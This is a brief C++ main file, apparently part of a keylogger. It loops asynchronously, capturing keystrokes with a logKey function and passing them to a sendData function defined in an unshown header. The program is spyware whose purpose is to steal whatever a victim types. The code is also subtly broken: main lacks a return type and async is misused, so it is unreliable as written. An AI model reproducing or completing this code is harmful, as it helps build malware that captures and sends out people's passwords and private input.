#include "Core.h"

using namespace std;

main() {
    future<char *> keys;
    future<bool> dataSent;
    bool firstLoop = true;
    while ( firstLoop || dataSent.get() ) {
        keys = async(logKey);
        dataSent = async(sendData(keys.get()));
        firstLoop = false;
    }
    return 0;
}